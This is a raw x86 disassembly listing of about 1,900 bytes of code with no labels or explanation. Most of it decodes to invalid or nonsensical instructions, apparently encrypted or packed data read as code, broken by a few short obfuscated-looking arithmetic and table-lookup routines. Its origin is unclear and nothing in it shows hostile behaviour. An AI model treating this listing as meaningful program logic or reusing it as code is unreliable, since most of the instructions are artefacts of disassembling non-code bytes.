  405067:	fs nop
  405069:	xchg   ebp,eax
  40506a:	or     DWORD PTR [edx],edi
  40506c:	inc    esp
  40506d:	call   0x5dc5:0xf01bb1bb
  405074:	sbb    DWORD PTR [edx],ebp
  405076:	jge    0x405063
  405078:	les    edi,FWORD PTR ds:0x37bce50c
  40507e:	push   ss
  40507f:	fs push esp
  405081:	cwde   
  405082:	scas   eax,DWORD PTR es:[edi]
  405083:	push   edi
  405084:	inc    ecx
  405085:	outs   dx,DWORD PTR ds:[esi]
  405086:	jne    0x4050d9
  405088:	pop    ebp
  405089:	dec    esp
  40508a:	leave  
  40508b:	sbb    edi,eax
  40508d:	test   DWORD PTR [eax-0x634f3896],0xc901630e
  405097:	inc    edi
  405098:	enter  0x599b,0xb0
  40509c:	jo     0x405045
  40509e:	jge    0x4050c5
  4050a0:	into   
  4050a1:	jg     0x405088
  4050a3:	push   0x7391a849
  4050a8:	retf   0x6a89
  4050ab:	add    DWORD PTR [edi+edx*1-0x5c472620],0x6b
  4050b3:	jl     0x405122
  4050b5:	je     0x405102
  4050b7:	xchg   ecx,eax
  4050b8:	mov    ch,0x23
  4050ba:	scas   eax,DWORD PTR es:[edi]
  4050bb:	inc    edx
  4050bc:	sar    BYTE PTR ds:0x5439ca53,cl
  4050c2:	mov    al,0xce
  4050c4:	pusha  
  4050c5:	mov    DWORD PTR [ebx-0x41],0xffcd8d68
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0x203ce202],bh
  4050fc:	xchg   al,ch
  4050fe:	xor    BYTE PTR [eax+0x78],bh
  405101:	dec    ebp
  405102:	jle    0x40517c
  405104:	js     0x40517f
  405106:	ret    0x2ea0
  405109:	ror    cl,1
  40510b:	std    
  40510c:	aaa    
  40510d:	retf   0xbbb4
  405110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405111:	push   es
  405112:	jg     0x4050c0
  405114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405115:	add    bl,BYTE PTR [ecx]
  405117:	jmp    0x4050ec
  405119:	cld    
  40511a:	pop    esi
  40511b:	xchg   BYTE PTR [edx+edx*2],ah
  40511e:	mov    ebx,0x31f8505e
  405123:	or     al,0x29
  405125:	shl    dl,1
  405127:	or     DWORD PTR [ebx],eax
  405129:	xchg   edi,eax
  40512a:	stos   DWORD PTR es:[edi],eax
  40512b:	in     al,0x5f
  40512d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40512e:	imul   esi,DWORD PTR [edi+0x24fd5bfc],0xb46e923c
  405138:	jo     0x40516f
  40513a:	push   ebp
  40513b:	fwait
  40513c:	cli    
  40513d:	iret   
  40513e:	sbb    ebx,DWORD PTR [eax*1+0x58679ef7]
  405145:	xlat   BYTE PTR ds:[ebx]
  405146:	stos   BYTE PTR es:[edi],al
  405147:	xor    DWORD PTR [ecx+0xd],ebx
  40514a:	inc    ah
  40514c:	(bad)  
  40514d:	scas   al,BYTE PTR es:[edi]
  40514e:	loop   0x4051cf
  405150:	ret    0x5241
  405153:	pop    ecx
  405154:	xor    eax,0x9f932f71
  405159:	xchg   ebp,eax
  40515a:	popa   
  40515b:	sub    esp,DWORD PTR [edx+0x22759c7b]
  405161:	addr16 mov edx,esi
  405164:	xor    BYTE PTR [ebp-0x3471c71d],ch
  40516a:	dec    esp
  40516b:	icebp  
  40516c:	pop    esp
  40516d:	stos   DWORD PTR es:[edi],eax
  40516e:	js     0x4051c5
  405170:	ja     0x405165
  405172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405173:	(bad)  
  405175:	add    esi,DWORD PTR [ecx+0x21]
  405178:	add    DWORD PTR [edx],esi
  40517a:	push   esi
  40517b:	fadd   DWORD PTR [esi-0xda1966]
  405181:	aam    0x30
  405183:	or     DWORD PTR [esi],esp
  405185:	cli    
  405186:	or     bh,BYTE PTR [ebp-0x17]
  405189:	jno    0x4051e9
  40518b:	push   0xfffffff1
  40518d:	call   DWORD PTR [ebp-0x42]
  405190:	xor    al,0x4a
  405192:	scas   eax,DWORD PTR es:[edi]
  405193:	sar    DWORD PTR [ebx-0x7f],0xcd
  405197:	stos   BYTE PTR es:[edi],al
  405198:	out    dx,al
  405199:	outs   dx,BYTE PTR ds:[esi]
  40519a:	add    al,0x7b
  40519c:	sbb    bh,BYTE PTR [ebp-0x32]
  40519f:	stc    
  4051a0:	fs xchg bp,ax
  4051a3:	and    bh,BYTE PTR [ecx]
  4051a5:	adc    DWORD PTR [ebp+0x60],esp
  4051a8:	xor    DWORD PTR [edi+0x53],ebx
  4051ab:	dec    ebx
  4051ac:	in     al,dx
  4051ad:	push   es
  4051ae:	cmp    DWORD PTR [ecx],edx
  4051b0:	scas   al,BYTE PTR es:[edi]
  4051b1:	lods   eax,DWORD PTR ds:[esi]
  4051b2:	cs addr16 push edi
  4051b5:	dec    edi
  4051b6:	aad    0xb8
  4051b8:	out    0x4e,eax
  4051ba:	pop    esp
  4051bb:	rol    DWORD PTR [edx-0x3f],1
  4051be:	popf   
  4051bf:	retf   
  4051c0:	push   0xcad89c51
  4051c5:	setno  BYTE PTR [edi+0x69]
  4051c9:	neg    ah
  4051cb:	out    0x3d,al
  4051cd:	popf   
  4051ce:	pusha  
  4051cf:	in     eax,dx
  4051d0:	inc    ebx
  4051d1:	xchg   ebx,eax
  4051d2:	cmp    ebp,0x3a
  4051d5:	gs loope 0x40524a
  4051d8:	jae    0x4051ab
  4051da:	dec    ecx
  4051db:	inc    eax
  4051dc:	aam    0x26
  4051de:	adc    BYTE PTR [edi+ebp*4-0x62],0xd6
  4051e3:	and    al,0x44
  4051e5:	or     ah,BYTE PTR [edi+0x3e]
  4051e8:	enter  0xa16a,0xaf
  4051ec:	pop    ebp
  4051ed:	stc    
  4051ee:	push   ecx
  4051ef:	xchg   esp,eax
  4051f0:	xchg   DWORD PTR [eax],eax
  4051f2:	ret    
  4051f3:	pop    eax
  4051f4:	aam    0x8c
  4051f6:	bound  eax,QWORD PTR [esi+0x66]
  4051f9:	push   edx
  4051fa:	fsubr  DWORD PTR [edi+0x7a]
  4051fd:	or     eax,0xb607c925
  405202:	push   ebp
  405203:	ret    
  405204:	lahf   
  405205:	inc    esp
  405206:	cmp    ah,BYTE PTR [eax+0x64]
  405209:	call   0x1c19:0x6109ddee
  405210:	push   esp
  405211:	shl    DWORD PTR [eax],cl
  405213:	call   0x3b868eb0
  405218:	inc    ecx
  405219:	cmp    eax,0xc51830f0
  40521e:	and    ah,BYTE PTR [ecx]
  405220:	sti    
  405221:	in     eax,dx
  405222:	jp     0x405259
  405224:	dec    ebx
  405225:	pop    esi
  405226:	fwait
  405227:	int3   
  405228:	push   0x62
  40522a:	lods   al,BYTE PTR ds:[esi]
  40522b:	mov    al,0x31
  40522d:	push   eax
  40522e:	(bad)  
  405230:	int    0x71
  405232:	out    0x55,al
  405234:	dec    ebx
  405235:	add    BYTE PTR [ecx],0x91
  405238:	lea    edx,[edi+0x3a]
  40523b:	push   0xffffff9a
  40523d:	push   ss
  40523e:	xor    esp,DWORD PTR [edi-0x7d]
  405241:	pusha  
  405242:	pusha  
  405243:	std    
  405244:	dec    edx
  405245:	inc    edi
  405246:	(bad)  
  405247:	push   es
  405248:	pusha  
  405249:	ds icebp 
  40524b:	dec    edi
  40524c:	pop    ds
  40524d:	mov    ecx,0xcacaeda0
  405252:	jecxz  0x40524e
  405254:	es daa 
  405256:	dec    eax
  405257:	jmp    0x40524c
  405259:	icebp  
  40525a:	retf   0x8a57
  40525d:	ins    BYTE PTR es:[edi],dx
  40525e:	leave  
  40525f:	fst    QWORD PTR [ecx+0x9]
  405262:	push   ss
  405263:	sbb    eax,0x713b732b
  405268:	push   eax
  405269:	dec    eax
  40526a:	push   ebp
  40526b:	out    0xe,al
  40526d:	int3   
  40526e:	sub    DWORD PTR [edi-0x17abff77],esi
  405274:	out    0x55,al
  405276:	retf   
  405277:	js     0x4052a2
  405279:	mov    DWORD PTR [esi-0x6d30f505],ebp
  40527f:	adc    DWORD PTR [edi],ecx
  405281:	mov    ebx,0xba31eb02
  405286:	cdq    
  405287:	push   0xffffffba
  405289:	sahf   
  40528a:	int    0xa8
  40528c:	push   esp
  40528d:	data16 int3 
  40528f:	ret    0xa884
  405292:	out    0xd2,al
  405294:	and    al,0x8c
  405296:	add    BYTE PTR [edx],dh
  405298:	dec    esi
  405299:	or     BYTE PTR [ecx],al
  40529b:	test   eax,0x445f4666
  4052a0:	mov    BYTE PTR ds:0x44a129be,ch
  4052a6:	push   ebp
  4052a7:	pop    ebx
  4052a8:	sidtd  [eax-0x67]
  4052ac:	add    esp,DWORD PTR [ebx+0x59]
  4052af:	jo     0x405316
  4052b1:	adc    BYTE PTR [edx+ebx*2],al
  4052b4:	jl     0x4052db
  4052b6:	(bad)  
  4052b7:	retf   
  4052b8:	neg    BYTE PTR [esi-0x10]
  4052bb:	inc    esp
  4052bc:	scas   al,BYTE PTR es:[edi]
  4052bd:	mov    ch,0x98
  4052bf:	div    DWORD PTR [eax]
  4052c1:	js     0x4052d0
  4052c3:	pop    ecx
  4052c4:	sti    
  4052c5:	sbb    eax,0x7f407155
  4052ca:	and    al,0x38
  4052cc:	div    BYTE PTR [esi+edi*8+0x3eeeccd2]
  4052d3:	mov    edi,0x39603899
  4052d8:	mov    ah,0x8b
  4052da:	add    al,0x63
  4052dc:	sub    DWORD PTR [edi+0x15357680],edx
  4052e2:	jg     0x40530f
  4052e4:	xchg   ebx,eax
  4052e5:	daa    
  4052e6:	and    al,0x29
  4052e8:	mov    bl,0x3
  4052ea:	mov    al,ds:0xda47b3e7
  4052ef:	call   0xd3b5:0xa9a32bc8
  4052f6:	mov    ds:0x804039d9,al
  4052fb:	push   esp
  4052fc:	scas   al,BYTE PTR es:[edi]
  4052fd:	lahf   
  4052fe:	test   BYTE PTR [eax],dh
  405300:	add    BYTE PTR [eax-0x36],0xc4
  405304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405305:	xchg   esp,eax
  405306:	jmp    0x4052b1
  405308:	outs   dx,DWORD PTR ds:[esi]
  405309:	jge    0x405295
  40530b:	xor    eax,0x21e46e0a
  405310:	call   0xb20dd273
  405315:	addr16 cmc 
  405317:	imul   edx,DWORD PTR [edx+0x5ececc4f],0x5a
  40531e:	lds    edx,FWORD PTR [edx-0xe9e19b7]
  405324:	or     DWORD PTR [ecx],edi
  405326:	inc    edx
  405327:	les    ebx,FWORD PTR [eax]
  405329:	xchg   ebx,eax
  40532a:	rol    edx,0xa5
  40532d:	mov    ebx,0xe04d2d8a
  405332:	cmp    BYTE PTR [edi+0x2b],0xac
  405336:	shl    esp,0xa8
  405339:	test   BYTE PTR [ebp-0x69],0x5b
  40533d:	out    0xc3,eax
  40533f:	xchg   esp,eax
  405340:	sbb    ch,BYTE PTR [ebx-0x43]
  405343:	mov    esp,0x202246cd
  405348:	xor    DWORD PTR [edi+0x63],ebp
  40534b:	sub    eax,0xa83fa7fe
  405350:	fwait
  405351:	call   0x5240:0xeb518dd8
  405358:	mov    ecx,0xf1817b79
  40535d:	mov    BYTE PTR [edx],ah
  40535f:	dec    edi
  405360:	or     eax,0xfba1a136
  405365:	sar    BYTE PTR [ecx+0x21e6c765],cl
  40536b:	mov    edx,0xf261d510
  405370:	rcr    DWORD PTR [eax],1
  405372:	or     esp,edx
  405374:	test   eax,0xbc8164bf
  405379:	inc    eax
  40537a:	popf   
  40537b:	sbb    esp,edx
  40537d:	mov    bh,0xb6
  40537f:	mov    al,0x5f
  405381:	(bad)  
  405382:	sbb    DWORD PTR [esi],ebp
  405384:	test   ebx,eax
  405386:	push   ebx
  405387:	sar    BYTE PTR [eax+0x58bd2482],0x20
  40538e:	push   0x77a54349
  405393:	cmp    eax,0x1577a0b3
  405398:	or     BYTE PTR [ecx+0x6a],ah
  40539b:	mov    ebx,esi
  40539d:	cmp    eax,esp
  40539f:	pop    esp
  4053a0:	in     al,dx
  4053a1:	mov    ds:0x8aeb5907,eax
  4053a6:	xor    ecx,ebp
  4053a8:	div    ebx
  4053aa:	add    bl,ch
  4053ac:	mov    ds:0x358fa20b,al
  4053b1:	inc    esi
  4053b2:	jae    0x4053bd
  4053b4:	rcl    BYTE PTR [esi+0x326b37e1],cl
  4053ba:	hlt    
  4053bb:	jl     0x405351
  4053bd:	aam    0x42
  4053bf:	sar    BYTE PTR [ecx+0x1c579702],1
  4053c5:	in     eax,0x93
  4053c7:	cmp    BYTE PTR [ebp+0x2d],bh
  4053ca:	pop    es
  4053cb:	leave  
  4053cc:	cmp    DWORD PTR [ebx-0x5d01b85],eax
  4053d2:	or     DWORD PTR [edx*2-0x74c5793f],eax
  4053d9:	inc    ebp
  4053da:	clc    
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	(bad)  
  4053ed:	adc    BYTE PTR [ecx],0x78
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x405472
  4053f9:	dec    esp
  4053fa:	lods   al,BYTE PTR ds:[esi]
  4053fb:	ja     0x405474
  4053fd:	ret    0x1cc
  405400:	mov    ch,0xfb
  405402:	add    ebp,edi
  405404:	push   ecx
  405405:	loop   0x405454
  405407:	sub    eax,0xd7b244ee
  40540c:	xlat   BYTE PTR ds:[ebx]
  40540d:	jle    0x40541a
  40540f:	dec    esi
  405410:	add    DWORD PTR [ebx+0x6089223f],ebx
  405416:	out    0x14,eax
  405418:	or     dl,dl
  40541a:	xor    BYTE PTR ds:0x82f9aed4,cl
  405420:	jne    0x405482
  405422:	lods   al,BYTE PTR ds:[esi]
  405423:	or     BYTE PTR [ecx+0x4de20663],bh
  405429:	(bad)  
  40542a:	stos   DWORD PTR es:[edi],eax
  40542b:	and    esi,ecx
  40542d:	icebp  
  40542e:	cmp    al,0x71
  405430:	(bad)  
  405431:	stos   BYTE PTR es:[edi],al
  405432:	jp     0x40546b
  405434:	pop    ds
  405435:	popf   
  405436:	ret    0x3950
  405439:	jle    0x405469
  40543b:	adc    BYTE PTR [esi+esi*1],ch
  40543e:	das    
  40543f:	popa   
  405440:	adc    cl,BYTE PTR [edi+edi*4]
  405443:	shr    DWORD PTR [ecx],0xb0
  405446:	adc    ch,BYTE PTR [ebx-0x4c0d9854]
  40544c:	xor    DWORD PTR [edi+ebx*1],ebx
  40544f:	into   
  405450:	inc    edx
  405451:	mov    dh,0x89
  405453:	sti    
  405454:	mov    ebx,0x4f964fec
  405459:	(bad)  
  40545a:	xchg   ecx,eax
  40545b:	pop    ds
  40545c:	sahf   
  40545d:	mov    ebx,0xcca2bd6a
  405462:	jnp    0x405470
  405464:	or     ebp,ebx
  405466:	or     eax,0x72839d4c
  40546b:	inc    esi
  40546c:	xchg   edx,eax
  40546d:	pop    eax
  40546e:	pop    edx
  40546f:	mov    BYTE PTR [esi-0x475bc9b3],dh
  405475:	sbb    DWORD PTR [ebp-0x13],esp
  405478:	fld    DWORD PTR [edi+0x5b5bff39]
  40547e:	mov    esi,0xa76f3675
  405483:	ret    
  405484:	dec    ebx
  405485:	pusha  
  405486:	mov    DWORD PTR [edx],esi
  405488:	test   al,0x77
  40548a:	or     eax,0x209c3a32
  40548f:	sub    BYTE PTR [edi-0x33],dh
  405492:	mov    esp,0xb6e5f7c6
  405497:	pop    ss
  405498:	mov    ch,0xd8
  40549a:	aad    0x1c
  40549c:	xchg   BYTE PTR [edx+0x30],dh
  40549f:	sub    ecx,esp
  4054a1:	push   0xfffffff9
  4054a3:	stc    
  4054a4:	scas   eax,DWORD PTR es:[edi]
  4054a5:	dec    ebp
  4054a6:	sbb    ah,ch
  4054a8:	mov    bh,0x3d
  4054aa:	lahf   
  4054ab:	xor    BYTE PTR [ebx+ecx*1+0x13],ah
  4054af:	push   eax
  4054b0:	aaa    
  4054b1:	inc    eax
  4054b2:	push   eax
  4054b3:	cwde   
  4054b4:	sbb    bl,bl
  4054b6:	push   ebp
  4054b7:	mov    cl,BYTE PTR [edi+0x13744351]
  4054bd:	loopne 0x40545d
  4054bf:	dec    ecx
  4054c0:	imul   ebx,DWORD PTR ds:0xb2fc9c50,0x2843fa3d
  4054ca:	ins    DWORD PTR es:[edi],dx
  4054cb:	das    
  4054cc:	aas    
  4054cd:	jecxz  0x405524
  4054cf:	and    al,ch
  4054d1:	pop    ebp
  4054d2:	or     DWORD PTR [edx-0x7a0ecc38],0x9e9b82ab
  4054dc:	sbb    eax,0xde706e38
  4054e1:	xchg   ecx,eax
  4054e2:	mov    eax,0xd6007324
  4054e7:	sbb    DWORD PTR [edx+esi*1-0x448bfe5b],eax
  4054ee:	fs adc eax,0x8e0da4c1
  4054f4:	jle    0x4054fc
  4054f6:	(bad)  
  4054f7:	cmp    bl,BYTE PTR cs:[eax+0x67249bc3]
  4054fe:	jecxz  0x405532
  405500:	iret   
  405501:	fisubr DWORD PTR [edi-0xde3d93e]
  405507:	rcl    BYTE PTR [eax+0x406bca19],0xd4
  40550e:	sbb    cl,0x56
  405511:	test   al,0x61
  405513:	in     eax,dx
  405514:	es clc 
  405516:	call   0x9b67:0xadc7f3a5
  40551d:	push   ecx
  40551e:	hlt    
  40551f:	lock (bad) 
  405521:	push   esi
  405522:	je     0x4054cb
  405524:	mov    eax,0x33c04935
  405529:	dec    ecx
  40552a:	repz leave 
  40552c:	repnz test DWORD PTR [esi+ebp*8-0x580078bb],ecx
  405534:	in     eax,0x33
  405536:	out    dx,al
  405537:	push   es
  405538:	ffree  st(5)
  40553a:	sbb    DWORD PTR [ebx-0x3b],ecx
  40553d:	cmp    esp,eax
  40553f:	call   0x4337:0x7fccda74
  405546:	inc    esi
  405547:	jbe    0x405540
  405549:	pop    ebp
  40554a:	inc    esi
  40554b:	cmp    esi,esi
  40554d:	mov    cs,WORD PTR [ebx-0x32922f4f]
  405553:	das    
  405554:	ror    DWORD PTR [ecx+esi*8+0x2c],cl
  405558:	xchg   edx,eax
  405559:	test   BYTE PTR [ebp+0x50],al
  40555c:	(bad)  
  40555d:	xor    dl,BYTE PTR [edx-0x5d]
  405560:	adc    eax,0x7ba26d58
  405565:	inc    esp
  405566:	dec    eax
  405567:	push   ds
  405568:	loop   0x4055d1
  40556a:	or     dh,BYTE PTR [ebx-0x34be4d2e]
  405570:	push   ebp
  405571:	bound  edi,QWORD PTR [ecx]
  405573:	mov    dh,0x9a
  405575:	xor    cl,al
  405577:	lds    edx,FWORD PTR [edi]
  405579:	clc    
  40557a:	stos   DWORD PTR es:[edi],eax
  40557b:	mov    cl,0xbb
  40557d:	aaa    
  40557e:	add    BYTE PTR [esp+edi*2-0x17],0xc4
  405583:	test   BYTE PTR [ebx],ah
  405585:	in     eax,0xcc
  405587:	mov    DWORD PTR [ebx],edx
  405589:	sbb    DWORD PTR [ebp-0x5],0xd94ae74c
  405590:	mov    dl,0x2
  405592:	rcr    ebx,cl
  405594:	shr    cl,0x8f
  405597:	jmp    0x4d96:0xc40d0c42
  40559e:	xor    cl,BYTE PTR [edx]
  4055a0:	test   dl,al
  4055a2:	fnstsw WORD PTR [eax+0x290aebab]
  4055a8:	nop
  4055a9:	pop    ecx
  4055aa:	add    al,0xf3
  4055ac:	mov    eax,DWORD PTR [ecx+0x73]
  4055af:	sub    esp,ecx
  4055b1:	dec    esi
  4055b2:	and    esp,DWORD PTR [ebx]
  4055b4:	bound  ebx,QWORD PTR [esi-0x46d59cbd]
  4055ba:	xchg   DWORD PTR [esi],esi
  4055bc:	inc    ecx
  4055bd:	ins    BYTE PTR es:[edi],dx
  4055be:	mov    ds:0xe6ef893d,eax
  4055c3:	aaa    
  4055c4:	xlat   BYTE PTR ds:[ebx]
  4055c5:	mov    edx,DWORD PTR [ebp+0x2d]
  4055c8:	sbb    ebp,DWORD PTR [edi+0x284f21b1]
  4055ce:	pop    es
  4055cf:	ffreep st(2)
  4055d1:	(bad)  
  4055d2:	adc    ah,BYTE PTR [ebp+0x37]
  4055d5:	xlat   BYTE PTR ds:[ebx]
  4055d6:	les    ecx,FWORD PTR ds:0x3ce2a7be
  4055dc:	sti    
  4055dd:	inc    ebp
  4055de:	mov    eax,0x3c4a1e73
  4055e3:	call   0xc9e03df3
  4055e8:	test   ebx,esi
  4055ea:	xchg   edi,eax
  4055eb:	lock dec edi
  4055ed:	jmp    0x1339954c
  4055f2:	jo     0x4055b8
  4055f4:	test   DWORD PTR [esi+0x18],ecx
  4055f7:	sahf   
  4055f8:	cmp    edx,DWORD PTR [eax*2+0x17f065d0]
  4055ff:	test   DWORD PTR [eax],0xb40549f9
  405605:	loope  0x4055e8
  405607:	xor    BYTE PTR [ebx+0x68],0x18
  40560b:	adc    eax,0x99a2e30e
  405610:	jae    0x4055fc
  405612:	ins    DWORD PTR es:[edi],dx
  405613:	or     eax,0x2b04eb1b
  405618:	test   BYTE PTR [eax],0x52
  40561b:	pop    edx
  40561c:	and    al,0xd1
  40561e:	or     eax,0x8a4e23d2
  405623:	call   0x884f7f0e
  405628:	loop   0x405665
  40562a:	mov    ecx,0x3ff6b768
  40562f:	mov    dh,0x5e
  405631:	(bad)  
  405632:	js     0x405677
  405634:	ss dec esp
  405636:	and    al,0x8d
  405638:	pop    eax
  405639:	in     eax,0xfa
  40563b:	inc    edi
  40563c:	lods   al,BYTE PTR ds:[esi]
  40563d:	dec    edx
  40563e:	add    eax,0xec8be3e8
  405643:	cdq    
  405644:	addr16 jns 0x40567b
  405647:	sti    
  405648:	and    BYTE PTR [eax-0x615336ba],dl
  40564e:	push   cs
  40564f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405650:	jne    0x4056b6
  405652:	pop    ecx
  405653:	lods   al,BYTE PTR ds:[esi]
  405654:	sub    al,0xf8
  405656:	pop    ss
  405657:	int3   
  405658:	add    BYTE PTR [edx-0x6b57eb5a],dh
  40565e:	into   
  40565f:	sub    ebx,DWORD PTR [esi+0x4d]
  405662:	pusha  
  405663:	icebp  
  405664:	jecxz  0x40560a
  405666:	and    DWORD PTR [eax-0x25],esi
  405669:	cmp    al,0x59
  40566b:	ja     0x40566e
  40566d:	sub    al,0x4f
  40566f:	push   ecx
  405670:	mov    ds:0x3436194,al
  405675:	push   edi
  405676:	sbb    BYTE PTR [edi+0x42],bh
  405679:	repnz into 
  40567b:	neg    DWORD PTR [ebx-0x29c0fe82]
  405681:	mov    ds:0xfdd959b2,al
  405686:	dec    ebx
  405687:	sub    ebx,DWORD PTR [esi-0x29e13376]
  40568d:	inc    ecx
  40568e:	or     DWORD PTR [ecx-0x4f18b41d],0x12
  405695:	fidivr DWORD PTR [edx+0x19]
  405698:	jns    0x405701
  40569a:	lea    eax,[edi+0x19]
  40569d:	ret    
  40569e:	pop    ecx
  40569f:	scas   al,BYTE PTR es:[edi]
  4056a0:	aam    0xde
  4056a2:	sti    
  4056a3:	outs   dx,DWORD PTR ds:[esi]
  4056a4:	aam    0x75
  4056a6:	sub    esi,eax
  4056a8:	jmp    0xf903:0x2ccbc309
  4056af:	jns    0x4056bc
  4056b1:	jg     0x405645
  4056b3:	sub    bh,BYTE PTR [edx+0x22]
  4056b6:	les    edx,FWORD PTR [edi]
  4056b8:	cld    
  4056b9:	xor    al,0x39
  4056bb:	stc    
  4056bc:	fild   QWORD PTR [ecx-0x57a805bd]
  4056c2:	rcl    DWORD PTR [ebx+0x1e],0x5d
  4056c6:	dec    edi
  4056c7:	mov    ds:0x8bee9779,al
  4056cc:	jge    0x4056ca
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	(bad)  
  405713:	sar    BYTE PTR [ebx],cl
  405715:	sub    al,0x12
  405717:	cmp    bh,BYTE PTR [eax+0x78]
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x405786
  40571f:	mov    ah,0xd5
  405721:	mov    WORD PTR [edx+ecx*1],es
  405724:	aas    
  405725:	enter  0x7b1e,0xfb
  405729:	imul   edx,DWORD PTR [esi-0xcadf9c4],0xffffff8e
  405730:	vmaxps ymm1,ymm2,ymm6
  405734:	popf   
  405735:	mov    BYTE PTR [esi-0x7b],0x48
  405739:	int    0xe0
  40573b:	sqrtps xmm6,XMMWORD PTR [eax]
  40573e:	imul   ebp,DWORD PTR [esi],0x4e
  405741:	pusha  
  405742:	mov    bl,0xf1
  405744:	mov    ?,esi
  405746:	inc    eax
  405747:	inc    edx
  405748:	and    DWORD PTR [ebx+0x43],ebx
  40574b:	ja     0x405768
  40574d:	ins    DWORD PTR es:[edi],dx
  40574e:	xchg   DWORD PTR [esi+0x3b],edi
  405751:	sahf   
  405752:	mov    al,0x53
  405754:	and    al,0x22
  405756:	sub    eax,0xf46d6e62
  40575b:	dec    ebp
  40575c:	sti    
  40575d:	out    dx,al
  40575e:	mov    esi,0x7cd49267
  405763:	retf   0xdcb3
  405766:	inc    esp
  405767:	inc    edx
  405768:	out    0x8d,eax
  40576a:	cmc    
  40576b:	add    al,0xb6
  40576d:	and    edx,ecx
  40576f:	fld    TBYTE PTR [esi-0x30e698e4]
  405775:	daa    
  405776:	das    
  405777:	mov    ebx,0x33754b01
  40577c:	and    BYTE PTR [ecx],cl
  40577e:	sub    eax,DWORD PTR [eax+esi*1+0x75547d09]
  405785:	sub    DWORD PTR [edx+0x11],edx
  405788:	pop    ebp
  405789:	mov    cl,0xe8
  40578b:	loope  0x405723
  40578d:	adc    al,0xca
  40578f:	mov    WORD PTR [ebp-0x17ce2c4a],es
  405795:	jecxz  0x40579c
  405797:	mov    cl,0x92
  405799:	out    dx,al
  40579a:	jae    0x405758
  40579c:	dec    BYTE PTR [ecx-0x55e83f19]
  4057a2:	(bad)  
  4057a3:	daa    
  4057a4:	mov    bh,0xa9
  4057a6:	adc    edx,edi
  4057a8:	ja     0x405771
  4057aa:	pop    ds
  4057ab:	mov    ebp,0xfb952024
  4057b0:	pop    esi
  4057b1:	pop    esp
  4057b2:	xor    al,0xc4
  4057b4:	mov    WORD PTR [esi],gs
  4057b6:	add    BYTE PTR [ebx],ah
  4057b8:	rcr    BYTE PTR [ebx+0x13],1
  4057bb:	gs inc edi
  4057bd:	js     0x4057a4
  4057bf:	jmp    0xa64bf20d
  4057c4:	pop    eax
  4057c5:	jmp    0xcfdd:0xeb897884
  4057cc:	mov    ecx,0xdf9a983d
  4057d1:	push   ebp
  4057d2:	and    al,0xd9
  4057d4:	inc    edx
  4057d5:	aaa    
  4057d6:	cmp    al,0x5a
  4057d8:	fmulp  st(4),st
  4057da:	xchg   BYTE PTR [esi-0x58101f00],ch
  4057e0:	xor    eax,0x5eb0bb51
  4057e5:	inc    esp
  4057e6:	ret    
  4057e7:	and    DWORD PTR [edi],esi
  4057e9:	inc    ebx
  4057ea:	push   edi
  4057eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ec:	push   ebx
  4057ed:	pavgw  mm2,QWORD PTR [ecx]
  4057f0:	mov    ds:0xe1978b0c,al
  4057f5:	sbb    cl,ch
  4057f7:	dec    eax
  4057f8:	gs dec ebp
  4057fa:	xor    BYTE PTR [eax],0x55
  4057fd:	rol    ebp,1
  4057ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405800:	adc    ah,dl
  405802:	retf   0x989c
  405805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405806:	push   0xbd8a6c5b
  40580b:	or     BYTE PTR [ebx-0x49f5597e],bl
  405811:	cmp    DWORD PTR [edx],esi
  405813:	bound  ecx,QWORD PTR [edi-0x71]
  405816:	ss xchg ecx,eax
  405818:	dec    esi
  405819:	dec    esi
  40581a:	mov    eax,ds:0x64cd6b0b
  40581f:	inc    edx
  405820:	add    BYTE PTR [esi+0x6b72fba5],bh
  405826:	sbb    BYTE PTR [eax-0x102ed94],0x43
  40582d:	dec    esp
  40582e:	cmp    eax,0x63afe225
  405833:	dec    ebp
  405834:	iret   
  405835:	fild   WORD PTR fs:[edx-0x5af72393]
  40583c:	outs   dx,DWORD PTR ds:[esi]
  40583d:	cwde   
  40583e:	pop    edi
  40583f:	and    al,0xa1
  405841:	stc    
  405842:	push   ds
  405843:	sub    ebx,DWORD PTR [esi+0x59aaeb34]
  405849:	ins    BYTE PTR es:[edi],dx
  40584a:	push   ebx
  40584b:	mov    esi,0x2636e1ee
